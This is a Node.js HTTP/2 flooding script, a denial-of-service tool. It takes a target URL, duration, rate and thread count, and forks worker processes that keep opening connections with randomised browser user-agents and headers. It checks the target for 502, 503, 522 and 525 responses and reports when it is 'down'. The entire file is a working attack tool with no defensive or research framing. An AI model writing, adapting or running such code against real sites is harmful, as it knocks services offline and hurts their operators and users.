const cluster = require("cluster");
const http2 = require("http2");
const os = require("os");
const axios = require("axios");
const hpack = require("hpack");
const path = require("path");
const url = require("url");
const Chance = require("chance");
const file = process.argv[1];
const name = path.basename(file);
const chance = new Chance();

const args = () => {
    return {
        target: process.argv[2],
        time: process.argv[3],
        rate: process.argv[4],
        thread: process.argv[5],
        header: process.argv[6],
    }
};

const { target, time, rate, thread, header } = args();
if (process.argv.length < 7) {
    console.log(`Usage: node ${name} target time rate thread showheader(on/off)`);
    process.exit();
}

const targetHost = url.parse(target);
if (targetHost.protocol !== "http:" && targetHost.protocol !== "https:") {
    console.log("Invalid protocol");
    process.exit();
}

axios({
    url: target,
    method: "GET",
})
.catch(error => {
    if (error.code === "ENOTFOUND") {
        console.log("Hostname is broken");
        process.exit();
    }
});

const randomUa = () => {
    const s1 = ["(iPhone; CPU iPhone OS 15_0_1 like Mac OS X)", "(Linux; Android 10; SM-A013F Build/QP1A.190711.020; wv)", "(Linux; Android 11; M2103K19PY)", "(Linux; arm_64; Android 11; SM-A515F)", "(Linux; Android 11; SAMSUNG SM-A307FN)", "(Linux; Android 10; SM-A025F)", "(Windows NT 10.0; Win64; x64)", "(Windows NT 6.3)"];
    const s2 = ["AppleWebKit/605.1.15", "AppleWebKit/537.36"];
    const s3 = ["Version/15.0 Mobile/15E148 Safari/604.1", "Version/4.0 Chrome/81.0.4044.138 Mobile Safari/537.36", "Chrome/96.0.4664.104 Mobile Safari/537.36", "Mobile/15E148", "SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"];
    const nm1 = chance.pickone(s1);
    const nm2 = chance.pickone(s2);
    const nm3 = chance.pickone(s3);
    return `Mozilla/5.0 ${nm1} ${nm2} (KHTML, like Gecko) ${nm3}`;
}

const ua = randomUa();

const accept = [
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", 
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", 
  "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
];
const lang = [
 'en-US',
  'zh-CN',
  'zh-TW',
  'ja-JP',
  'en-GB',
  'en-AU',
  'en-GB,en-US;q=0.9,en;q=0.8',
  'en-GB,en;q=0.5',
  'en-CA',
];
const encoding = [
  'gzip',
  'gzip, deflate, br',
  'compress, gzip',
  'deflate, gzip',
  'gzip, identity',
  'gzip, deflate',
  'br',
];
const headers = {
    ":method": "GET",
    ":path": targetHost.pathname,
    ":authority": targetHost.hostname,
    ":scheme": targetHost.protocol.replace(":", ""),
    "user-agent": ua,
    "accept-header": chance.pickone(accept),
    "accept-language": chance.pickone(lang),
    "accept-encoding": chance.pickone(encoding),
    "origin": target,
    "upgrade-insecure-requests": "1",
};

function flood() {
    const interval = setInterval(() => {
        for (let i = 0; i < rate; i++) {
            const client = http2.connect(target, {
                protocol: "https",
                settings: {
                    maxConcurrentStreams: 2000,
                    maxFrameSize: 16384,
                    initialWindowSize: 15564991,
                    maxHeaderListSize: 32768,
                    enablePush: false,
                    headerTableSize: 65536,
                },
                maxSessionMemory: 64000
            });
            axios.get(target)
            .then(response => {
            	if([502, 503, 525, 522].includes(response.status)) {
			console.log("Target is down")
		}
	    })
            const hpackEncoder = new hpack();
            const encodeHeader = hpackEncoder.encode(headers);
            const session = client.request(encodeHeader);

            session.on("response", () => {
                client.close();
                client.destroy();
            });

            session.on("error", () => {
                client.close();
                client.destroy();
            });
            session.on("end", () => {
                client.close();
                client.destroy();
            });

            if (header === "on") {
                console.log(headers);
            }
	}
    })
}

if (cluster.isMaster) {
    console.log(`Target is ${target}`);
    const handleReset = () => {
        cluster.on("exit", (worker, code, signal) => {
            setTimeout(() => {
                cluster.fork();
            }, 100);
        });
        const total = os.totalmem();
        const used = process.memoryUsage().rss;
        const yourmem = (used / total) * 100;
        if (yourmem >= 85) {
            console.log("[!]Ram is full, proceed to kill worker");
            const workers = Object.values(cluster.workers);
            const randomWorker = chance.pickone(workers);
            randomWorker.kill();
        }
    };
    setInterval(() => {
        handleReset();
    }, 2000);
    for (let i = 0; i < thread; i++) {
        cluster.fork();
    }
} else {
    setInterval(() => {
        flood();
    })
}

setTimeout(() => {
    process.exit();
}, time * 1000);
